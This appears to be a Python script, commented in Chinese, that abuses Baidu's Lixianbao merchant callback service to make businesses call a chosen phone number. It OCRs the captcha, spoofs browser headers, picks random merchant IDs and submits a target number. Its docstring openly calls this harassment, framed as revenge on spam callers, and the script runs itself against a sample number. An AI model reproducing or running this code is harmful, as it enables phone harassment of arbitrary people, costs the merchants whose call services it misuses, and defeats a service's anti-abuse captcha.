"""
排山倒海的推广电话，吾辈当以毒攻毒
"""

import time
import re
import json
import random
import requests
import pytesseract
from PIL import Image
from io import BytesIO

# 使用带session的请求
sss = requests.Session()


# 1. 获取验证码并识别
# 2. 获取token
# 3. 发起通话请求
def diss_spam_call(phone):
    """
    这里就是骚扰电话的逻辑了，借用百度离线宝
    @param  phone           需要骚扰的电话，电话的格式必须正确，这里不做电话有效性验证了
    @param  bid             商户id（目前lxb商户ID范围在0-9200之间大部分有效）
    @return call_status     提交骚扰的状态码，0为骚扰成功，其他的值为可能成功
    @return False           其他异常，未能获取call_status，token等场景
    """
    # 全局变量
    scode = ""
    token = ""

    # 配置参数
    f = 55
    id = random.randint(1, 9200)
    g = 0
    _ = t = int(time.time() * 1000)
    t = int(time.time() * 1000 + 320)
    r = ''
    callback = 'jQuery11110595526036238333_' + str(int(time.time() * 1000))

    base_url = "http://lxbjs.baidu.com/cb"
    scode_url = base_url + "/scode"
    token_url = base_url + '/url/check'
    call_url = base_url + '/call'

    # 自定义headers
    headers = {
        'Accept':
        'text/javascript, \
            application/javascript, \
            application/ecmascript, \
            application/x-ecmascript, */*; q=0.01',
        'Accept-Encoding':
        'gzip, deflate',
        'Accept-Language':
        'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection':
        'keep-alive',
        'Host':
        'lxbjs.baidu.com',
        'Referer':
        'http://lxbjs.baidu.com/cb/url/show?f={f}&id={id}'.format(f=f, id=id),
        'User-Agent':
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) \
            AppleWebKit/537.36 (KHTML, like Gecko) \
            Chrome/65.0.3325.181 Safari/537.36',
        'X-Requested-With':
        'XMLHttpRequest'
    }

    # 获取并识别验证码
    r_scode_params = {"t": t}

    r_scode = sss.get(scode_url, params=r_scode_params, headers=headers)
    if (r_scode.status_code == 200):
        # 获取验证码图片
        scode_image = Image.open(BytesIO(r_scode.content))
        print(scode_image)
        # 识别验证码图片, 不得不说，识别准确率太低了。
        scode = pytesseract.image_to_string(scode_image)
        print(scode)
    else:
        # 获取验证码失败
        return

    # 2. 获取token
    r_token_params = {
        'callback': callback,
        'f': f,
        'id': id,
        'g': g,
        't': t,
        'r': r,
        '_': _
    }

    r_token = sss.get(token_url, params=r_token_params, headers=headers)

    if r_token.status_code == 200:
        # 获取token
        r_token_json = loads_jsonp(r_token.text)
        token = r_token_json['data']['tk']
        print(token)
    else:
        # 获取token失败
        return

    # 3. 开始提交通话

    r_call_params = {
        'callback': callback,
        'f': f,
        'id': id,
        'tk': token,
        'vtel': phone,
        '_': _ + 1
    }

    # 提交打电话申请
    r_call = sss.get(call_url, params=r_call_params, headers=headers)

    if r_call.status_code == 200:
        # 请求成功，获取结果类型
        r_call_json = loads_jsonp(r_call.text)
        print(r_call_json)
        print(r_call_json['status'])
        # 163: 验证码错误，152: 号码有误，161: 非法请求, 0: 电话回拨，115: 短信通知, 105: 呼叫过于频繁
    else:
        return


def loads_jsonp(_jsonp):
    """
    解析jsonp
    # 作者：阿阿聪
    # 链接：https://www.zhihu.com/question/52841349/answer/132564221
    # 来源：知乎
    # 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

    :param _jsonp
    :return json
    """
    try:
        return json.loads(re.match(".*?({.*}).*", _jsonp, re.S).group(1))
    except ValueError:
        raise ValueError('Invalid jsonp input')


diss_spam_call('18100001111')